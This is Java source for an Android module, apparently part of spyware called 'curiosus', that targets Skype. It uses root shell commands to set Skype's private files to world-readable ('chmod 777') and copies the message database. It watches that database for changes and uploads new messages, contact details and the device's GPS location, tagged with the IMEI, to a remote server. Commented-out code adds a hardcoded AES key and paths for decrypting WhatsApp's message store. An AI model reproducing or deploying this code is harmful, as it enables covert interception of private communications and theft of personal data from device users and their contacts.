package com.hyadesinc.curiosus.modules;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.FileObserver;
import android.preference.PreferenceManager;
import android.util.Xml;

import com.hyadesinc.curiosus.Debug;
import com.hyadesinc.curiosus.ServerMessanger;
import com.hyadesinc.curiosus.SettingsManager;
import com.hyadesinc.curiosus.lib.FileUtil;
import com.hyadesinc.curiosus.lib.IMMessage;
import com.hyadesinc.curiosus.lib.IMessageBody;
import com.hyadesinc.curiosus.lib.MessageType;
import com.hyadesinc.curiosus.modules.location.LocationModule;
import com.hyadesinc.curiosus.services.AppService;
import com.hyadesinc.curiosus.variables.ServerMessage;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import org.json.JSONObject;
import org.xmlpull.v1.XmlPullParser;

import java.io.FileInputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;

@SuppressLint("SdCardPath")
public class SkypeModule implements OnSharedPreferenceChangeListener {
//	private static final String CHIPER_TRANSFORMATION = "AES/ECB/PKCS5Padding";
//	private static final String ALGORITHM = "AES";
//	private static final byte[] KEY = new byte[]{ 52, 106, 35, 101, 42, 70, 57, 43, 77, 115, 37, 124, 103, 49, 126, 53, 46, 51, 114, 72, 33, 119, 101, 44 };

//	private static final String W_CLEAR_DB = "/data/data/com.whatsapp/databases/msgstore.db";
//	private static String m_whatsappClearDBName = "/data/data/com.whatsapp/databases/msgstore.db";
//    private static String m_whatsappCryptedDBName = "msgstore.db.crypt";
//    private static String m_whatsappDBName = "whatsapp.db";
//    private static String m_whatsappDataName = "/data/data/com.whatsapp/databases/";

//	private byte[] decryptDB(byte[] encryptedDB) throws Exception {
//	Cipher ciper = Cipher.getInstance(CHIPER_TRANSFORMATION);
//	SecretKeySpec key = new SecretKeySpec(KEY, ALGORITHM);//TODO: test key
//	ciper.init(Cipher.DECRYPT_MODE, key);
//	byte[] result = ciper.doFinal(encryptedDB);
//	return result;
//}

	/** WhatsApp messages db path */
	private static final String PATH_MESSAGES = "/data/data/com.skype.raider/files/";

    private static final String PATH_SHARED_XML = "/data/data/com.skype.raider/files/shared.xml";


    private String USERNAME = "";
	/** WhatsApp contacts db path */
	private static final String[] MESSAGES_COLUMNS = new String[] {"id", "convo_id", "chatname", "author", "from_dispname", "timestamp", "type", "body_xml", "participant_count", "chatmsg_type", "chatmsg_status", "pk_id", "crc", "remote_id", "server_id", "timestamp__ms", "extprop_EXTENDED_TELEMETRY_MESSAGE_SEND_NETWORK_TYPE"};
	private static final String[] CONTACTS_COLUMNS = new String[] { "id", "type", "skypename", "fullname", "birthday", "gender", "languages", "country", "province", "city", "phone_home", "phone_office", "phone_mobile", "homepage", "about", "mood_text", "timezone", "profile_timestamp", "lastonline_timestamp", "displayname", "firstname", "lastname", "given_displayname", "assigned_speeddial", "external_id", "external_system_id", "avatar_url" };
	private static final String SETTINGS_LASTID = "SKYPE_LAST_ID";

	private String LOCAL_PATH_MESSAGES = "";

	private Context mContext;
	private SettingsManager mSettings;
	private String mLastMsgId;
	private FileObserver mObserver;
	private HashMap<String, String> mUsernames;
	private boolean mIsStarted;

    private String GLOBAL_PATH_DB = "";

    private XmlPullParser parser = Xml.newPullParser();

	public SkypeModule(Context context){
		this.mContext = context;
		this.mSettings = new SettingsManager(context);
		this.mUsernames = new HashMap<String, String>();
		this.mIsStarted = false;

        LOCAL_PATH_MESSAGES = FileUtil.getFullPath(context, "main_w.db");


        PreferenceManager.getDefaultSharedPreferences(context).registerOnSharedPreferenceChangeListener(this);
	}

	@Override
	public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
		if (key.equals("SKYPE_ENABLED")){
			if (mSettings.isSkypeEnabled()) {
				if (!mIsStarted) {
					start();
				}
			}
			else{
				if (mIsStarted) {
					stop();
				}
			}
		}
	}

    public String getUserName() {
        try {
            InputStream is = new FileInputStream(PATH_SHARED_XML);

            parser.setInput(is, null);
            parser.nextTag();

            parser.require(XmlPullParser.START_TAG, null, "config");

            while (parser.next() != XmlPullParser.END_TAG) {

                try {


                    String name = parser.getName();
                    // Starts by looking for the entry tag
                    if (name.equals("Default")) {
                        if(parser.next() == XmlPullParser.TEXT) {
                            USERNAME = parser.getText();
                            Debug.i("Skype username: " + USERNAME);
                            return USERNAME;
                        }

                    }

                } catch (java.lang.NullPointerException e) {
                    continue;
                } finally {
                    is.close();
                }
            }

        } catch (Exception e)  {
            e.printStackTrace();
            stop();
        }

        return "";
    }

	public synchronized void start(){
		if (!mSettings.isSkypeEnabled()) {
			Debug.i("[SkypeModule] " + mSettings.isSkypeEnabled().toString()) ;
			return;
		}

		if (!isSkypeAvailable()) {
			return;
		}

		if (!AppService.isRootAvailable()) {
			return;
		}

		MyCommandCapture command = new MyCommandCapture(
				"chmod 777 /data/data/com.skype.raider/files/*",
                "chmod 777 /data/data/com.skype.raider/files/" + getUserName() + "/*",
				"chmod 777 " + FileUtil.getFullPath(mContext, "*"));

        GLOBAL_PATH_DB = PATH_MESSAGES +  getUserName() + "/main.db";

		command.setCallback(new ICommandCallback() {
			@Override
			public void run() {

                String PATH_DB = PATH_MESSAGES +  getUserName() + "/main.db";
                Debug.i("Skype DB path: " + PATH_DB);

				FileUtil.copyFile(PATH_DB, LOCAL_PATH_MESSAGES);

				SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
				mLastMsgId = settings.getString(SETTINGS_LASTID, getLastMsgId());
				mObserver = new SkypeFileObserver();

				Debug.i("[SkypeModule] Start watching");
				mObserver.startWatching();

				mIsStarted = true;

               getUserName();
			}
		});

		try {
			RootTools.getShell(true).add(command);

		} catch (Exception e) {
			Debug.exception(e);

		}
	}

	private synchronized void stop() {
		mIsStarted = false;

		try {
			saveLastMsgId(mLastMsgId);
			if (mObserver != null) {
				mObserver.stopWatching();
			}

		} catch (Exception e) {
			Debug.exception(e);
			return;

		} finally {
			mObserver = null;
		}
	}

	public void dispose(){
		stop();
	}

	protected synchronized void getNewChat(){
        String PATH_DB = PATH_MESSAGES +  getUserName() + "/main.db";
		MyCommandCapture command = new MyCommandCapture(
				"chmod 777 /data/data/com.skype.raider/files/*",
                "chmod 777 /data/data/com.skype.raider/files/" + getUserName() + "/*",
				"chmod 777 /data/data/com.skype.raider/files");

		command.setCallback(new ICommandCallback() {
			@Override
			public void run() {
				_getNewChat();
			}
		});

		try {
			RootTools.getShell(true).add(command);

		} catch (Exception e) {
			Debug.exception(e);
		}
	}

	private synchronized void _getNewChat(){
        String PATH_DB = PATH_MESSAGES +  getUserName() + "/main.db";
		if (!FileUtil.copyFile(PATH_DB, LOCAL_PATH_MESSAGES)) {
			return;
		}

		SQLiteDatabase db = null;

		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_MESSAGES, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			ArrayList<IMessageBody> list = getMessages(db);

			if (list == null) {
				return;
			}



			db.close();
			db = null;

			if (list != null && list.size() > 0 && networkAvailable()) {
				JSONObject obj = new JSONObject();
				new ServerMessanger(
						mContext,
						new ServerMessage(MessageType.SKYPE, mSettings.imei(), list),
						new ServerMessanger.ICallBack() {
							@Override
							public boolean onFinished(String response) { return false; }

							@Override
							public void onError() {
							}

							@Override
							public void onSuccess() {
								saveLastMsgId(mLastMsgId);
							}
						}
				).start();
			}

		} catch (Exception e) {
			Debug.exception(e);

		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}
		}
	}

	private ArrayList<IMessageBody> getMessages(SQLiteDatabase db){
		Cursor c = null;
		try {
			ArrayList<IMessageBody> messages = new ArrayList<IMessageBody>();
			IMMessage message;
			long timeout = new Date().getTime() - LocationModule.LOCATION_TIMEOUT;
			Debug.i("Last ID: " + mLastMsgId);
			c = db.query("Messages", MESSAGES_COLUMNS, "id > " + mLastMsgId, null, null, null, null);
			while (c.moveToNext()) {
				String mid = c.getString(0);
                String external_id = c.getString(14);
                String jid = c.getString(3);
				int type = c.getInt(6); /* c.getInt(1) == 1 - is out;*/
				String text = c.getString(7);
				long date = c.getLong(15); /* time */
                String extra = c.getString(16);

                message = new IMMessage(date, text, type);

                message.addMessageId(mid);
                message.addMessageExternalId(external_id);
                message.addMessageExtra(extra);

				if (date >= timeout) {
					Location location = LocationModule.getLocation(mContext);
					if (location != null) {
						message.addLocation(location.getLatitude(), location.getLongitude());
					}
				}

                message = setUserInfo(jid, message);
				messages.add(message);

				final String lastMsgId = mLastMsgId;
				mLastMsgId = mid;
				saveLastMsgId(mLastMsgId);
			}

			return messages;

		} catch(Exception e){
			Debug.exception(e);
			return null;

		} finally {
			if (c != null) {
				c.close();
			}
		}
	}

	private synchronized IMMessage setUserInfo(String jid, IMMessage message){
        message.addAuthorUsername(jid);

		SQLiteDatabase db = null;
		Cursor c = null;
		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_MESSAGES, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			c = db.query("Contacts", CONTACTS_COLUMNS, "skypename = ?", new String[] { jid }, null, null, null);

			if (c.getCount() != 1) {
				return message;
			} else if (c.moveToFirst()) {


                //message.addAuthorUsername(c.getString(2));
                message.addAuthorFullName(c.getString(3));
                message.addAuthorBirthday(c.getLong(4));
                message.addAuthorGender(c.getString(5));
                message.addAuthorCountry(c.getString(6));
                message.addAuthorProvince(c.getString(7));
                message.addAuthorCity(c.getString(8));
                message.addAuthorPhone(c.getString(11));
                message.addAuthorHomePage(c.getString(12));
                message.addAuthorAbout(c.getString(13));
                message.addAuthorMood(c.getString(14));
                message.addAuthorUid(c.getString(23));



                return message;

            } else {
                return message;
            }

		} catch(Exception e){
			e.printStackTrace();
			return message;

		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}

			if (c != null) {
				c.close();
			}
		}
	}

	private String getLastMsgId(){

		SQLiteDatabase db = null;
		Cursor c = null;
		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_MESSAGES, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			c = db.rawQuery("SELECT MAX(id) FROM Messages", null);
			c.moveToFirst();
			return c.getString(0);

		} catch(Exception e){
			Debug.exception(e);
			return "0";

		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}

			if (c != null) {
				c.close();
			}
		}
	}

	private int getLastMsgId(SQLiteDatabase db){
		Cursor c = null;
		try {
			c = db.rawQuery("SELECT MAX(id) FROM Messages", null);
			c.moveToFirst();
			return c.getInt(0);

		} catch(Exception e){
			Debug.exception(e);
			return 0;

		} finally {
			if (c != null) {
				c.close();
			}
		}
	}

	private Boolean isSkypeAvailable(){
		try {
			mContext.getPackageManager().getPackageInfo("com.skype.raider", PackageManager.GET_ACTIVITIES);
			return true;

		} catch (NameNotFoundException e) {
			return false;
		}
	}

	private synchronized void saveLastMsgId(String lastMsgId){
		if (lastMsgId == "0") {
			return;
		}

		mSettings.skypeLastId(lastMsgId);
	}

	private Boolean networkAvailable(){
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();

		if (info == null){
			return false;
		}

		if (mSettings.onlyWiFi() && info.getType() != ConnectivityManager.TYPE_WIFI){
			return false;
		}

		return info.isConnectedOrConnecting();
	}

	private class MyCommandCapture extends CommandCapture{
		private ICommandCallback callback;

		public MyCommandCapture(String... command){
			super(0, command);
		}

		public void setCallback(ICommandCallback callback){
			this.callback = callback;
		}

		@Override
		public void commandCompleted(int id, int exitcode) {
			if (callback != null) {
				callback.run();
			}
		}
	}

	private interface ICommandCallback{
		public void run();
	}

	private class SkypeFileObserver extends FileObserver {
		private static final long UPDATE_TIOMEOUT = 2 * 1000L;

		private long lastUpdate;

		public SkypeFileObserver() {
			super(GLOBAL_PATH_DB, FileObserver.MODIFY);
		}

		@Override
		public synchronized void onEvent(int event, String path) {
			Debug.i("onEvent: " + event + "; Path: " + path);

			long now = Calendar.getInstance().getTimeInMillis();
			if (now - lastUpdate < UPDATE_TIOMEOUT) {
				return;
			}

			lastUpdate = now;

			new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						Thread.sleep(UPDATE_TIOMEOUT);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}

					getNewChat();
				}
			}).start();

		}
	}
}
